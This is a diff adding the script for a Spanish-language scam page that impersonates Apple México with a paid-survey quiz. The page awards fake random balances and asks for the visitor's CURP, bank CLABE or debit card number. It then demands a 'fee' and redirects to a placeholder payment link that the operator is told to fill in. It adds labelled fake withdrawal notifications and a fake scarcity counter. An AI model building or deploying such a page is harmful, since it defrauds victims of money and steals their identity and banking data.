@@ -807,4 +807,189 @@
         <div class="popup-label">¡Acabas de ganar!</div>
         <div class="popup-valor" id="popupValor">$0.00 MXN</div>
         <p class="popup-subtitle">Este monto se ha sumado a tu saldo</p>
-        <button class="btn-primary" onclick
+        <button class="btn-primary" id="btnProxima">Continuar ➜</button>
+    </div>
+</div>
+
+<script>
+    // Variables de Audio
+    const moneySound = new Audio('https://cdn.pixabay.com/audio/2021/08/04/audio_062564245c.mp3');
+
+    // Configuración del Quiz
+    const quizData = [
+        { q: "¿Qué opinas del nuevo iPhone 15 Pro?", options: ["Increíble", "Muy costoso", "Prefiero Android", "Excelente cámara"] },
+        { q: "¿Comprarías un Apple Watch este año?", options: ["Sí, me encanta", "Tal vez", "No es para mí", "Ya tengo uno"] },
+        { q: "¿Qué tan satisfecho estás con iOS 17?", options: ["Muy satisfecho", "Regular", "Pocos cambios", "Me gusta mucho"] },
+        { q: "¿Qué color de iPhone prefieres?", options: ["Titanio Natural", "Negro", "Azul", "Blanco"] },
+        { q: "¿Usas Apple Pay en México?", options: ["Siempre", "A veces", "No sabía que existía", "Prefiero efectivo"] },
+        { q: "¿Qué producto Apple esperas más?", options: ["Nuevos iPad", "MacBook M3", "Vision Pro", "AirPods Max 2"] },
+        { q: "¿Cómo calificarías la batería de tu Apple?", options: ["Excelente", "Buena", "Puede mejorar", "Mala"] },
+        { q: "¿Te gusta la Isla Dinámica?", options: ["Es muy útil", "Me da igual", "Prefiero el notch", "No la uso"] },
+        { q: "¿Qué capacidad de memoria prefieres?", options: ["128GB", "256GB", "512GB", "1TB"] },
+        { q: "¿Recomendarías Apple a un amigo?", options: ["Seguro", "Probablemente", "No", "Solo si tiene dinero"] },
+        { q: "¿Usas iCloud para tus fotos?", options: ["Sí, el plan de pago", "Solo el gratis", "No lo uso", "Uso Google Fotos"] },
+        { q: "¿Qué tan importante es el diseño para ti?", options: ["Lo más importante", "Es secundario", "No me importa", "Me da igual"] }
+    ];
+
+    let currentQ = 0;
+    let totalSaldo = 0;
+
+    // --- Lógica del Splash Screen ---
+    window.onload = () => {
+        const fill = document.getElementById('splashFill');
+        const percentText = document.getElementById('splashPercent');
+        const statusText = document.getElementById('splashStatus');
+        const screen = document.getElementById('splashScreen');
+        const quizContainer = document.getElementById('quizContainer');
+        
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 3) + 1;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                
+                statusText.innerText = "Acceso Concedido";
+                setTimeout(() => {
+                    screen.classList.add('hide');
+                    quizContainer.style.display = 'block';
+                    loadQuestion();
+                }, 800);
+            }
+            
+            fill.style.width = progress + '%';
+            percentText.innerText = progress + '%';
+            
+            if(progress > 30) statusText.innerText = "Sincronizando con Apple México...";
+            if(progress > 60) statusText.innerText = "Validando cupos disponibles...";
+            if(progress > 85) statusText.innerText = "Preparando tu recompensa...";
+        }, 50);
+
+        // Partículas del splash
+        const particles = document.getElementById('splashParticles');
+        for(let i=0; i<30; i++) {
+            const p = document.createElement('div');
+            p.className = 'splash-particle';
+            p.style.left = Math.random() * 100 + 'vw';
+            p.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            p.style.animationDelay = Math.random() * 5 + 's';
+            particles.appendChild(p);
+        }
+    };
+
+    // --- Lógica del Quiz ---
+    function loadQuestion() {
+        const data = quizData[currentQ];
+        document.getElementById('qTitle').innerText = data.q;
+        document.getElementById('progressText').innerText = `Pregunta ${currentQ + 1} de 12`;
+        document.getElementById('progressBar').style.width = ((currentQ + 1) / 12 * 100) + '%';
+        
+        const optionsDiv = document.getElementById('options');
+        optionsDiv.innerHTML = '';
+        
+        data.options.forEach(opt => {
+            const div = document.createElement('div');
+            div.className = 'option';
+            div.innerText = opt;
+            div.onclick = () => {
+                document.querySelectorAll('.option').forEach(el => el.classList.remove('selected'));
+                div.classList.add('selected');
+                document.getElementById('btnNext').disabled = false;
+            };
+            optionsDiv.appendChild(div);
+        });
+        document.getElementById('btnNext').disabled = true;
+    }
+
+    document.getElementById('btnNext').onclick = () => {
+        const ganado = Math.floor(Math.random() * (120 - 70 + 1)) + 70;
+        totalSaldo += ganado;
+        
+        document.getElementById('popupValor').innerText = `$${ganado}.00 MXN`;
+        document.getElementById('popupGanhou').style.display = 'flex';
+        
+        // Sonido de dinero
+        moneySound.currentTime = 0;
+        moneySound.play();
+    };
+
+    document.getElementById('btnProxima').onclick = () => {
+        document.getElementById('popupGanhou').style.display = 'none';
+        document.getElementById('saldoTopo').innerText = `$${totalSaldo}.00 MXN`;
+        
+        currentQ++;
+        if (currentQ < quizData.length) {
+            loadQuestion();
+        } else {
+            document.getElementById('quizContainer').style.display = 'none';
+            document.getElementById('resgateContainer').style.display = 'block';
+            document.getElementById('saldoFinal').innerText = `$${totalSaldo}.00 MXN`;
+        }
+    };
+
+    // --- Retiro y Flujo Final ---
+    document.getElementById('metodoSelect').onchange = (e) => {
+        const labels = { curp: "Ingresa tu CURP:", clabe: "Ingresa tu CLABE (18 dígitos):", tarjeta: "Número de Tarjeta de Débito:" };
+        const placeholders = { curp: "Ej: GARC850101HDFRRL09", clabe: "Ej: 012180004567890123", tarjeta: "Ej: 4152 0000 0000 0000" };
+        document.getElementById('inputLabel').innerText = labels[e.target.value];
+        document.getElementById('chaveInput').placeholder = placeholders[e.target.value];
+    };
+
+    document.getElementById('btnSolicitar').onclick = () => {
+        if(document.getElementById('chaveInput').value.length < 5) return alert("Por favor ingresa un dato válido");
+        
+        document.getElementById('btnSolicitar').style.display = 'none';
+        document.getElementById('validando').style.display = 'flex';
+        
+        setTimeout(() => {
+            document.getElementById('resgateContainer').style.display = 'none';
+            document.getElementById('taxaContainer').style.display = 'block';
+            document.getElementById('valorComTaxa').innerText = `$${totalSaldo + 69}.00 MXN`;
+        }, 3000);
+    };
+
+    document.getElementById('btnPagarTaxa').onclick = () => {
+        document.getElementById('taxaContainer').style.display = 'none';
+        document.getElementById('envioContainer').style.display = 'block';
+    };
+
+    document.getElementById('btnFinalizar').onclick = () => {
+        // Aquí rediriges a tu link de pago de la tasa
+        window.location.href = "TU_LINK_DE_PAGO_AQUI";
+    };
+
+    // Notificaciones Falsas
+    const names = ["Ricardo M.", "Sofía G.", "Javier L.", "Elena P.", "Marcos T.", "Lucía R.", "Daniel V.", "Carmen S."];
+    const amounts = [1250, 980, 1420, 1100, 850, 1340];
+    const imgs = [
+        "https://randomuser.me/api/portraits/men/32.jpg",
+        "https://randomuser.me/api/portraits/women/44.jpg",
+        "https://randomuser.me/api/portraits/men/46.jpg",
+        "https://randomuser.me/api/portraits/women/65.jpg"
+    ];
+
+    function showNotif() {
+        document.getElementById('notifImg').src = imgs[Math.floor(Math.random()*imgs.length)];
+        document.getElementById('notifTitle').innerText = names[Math.floor(Math.random()*names.length)];
+        document.getElementById('notifText').innerText = "Acaba de retirar $" + amounts[Math.floor(Math.random()*amounts.length)] + " MXN";
+        
+        const n = document.getElementById('notification');
+        n.classList.add('show');
+        setTimeout(() => n.classList.remove('show'), 4000);
+        setTimeout(showNotif, Math.random() * 15000 + 10000);
+    }
+    setTimeout(showNotif, 5000);
+
+    // Contador de cupos
+    let v = 12;
+    setInterval(() => {
+        if(v > 3) {
+            v--;
+            document.getElementById('vagas').innerText = v;
+        }
+    }, 20000);
+
+</script>
+
+</body>
+</html>
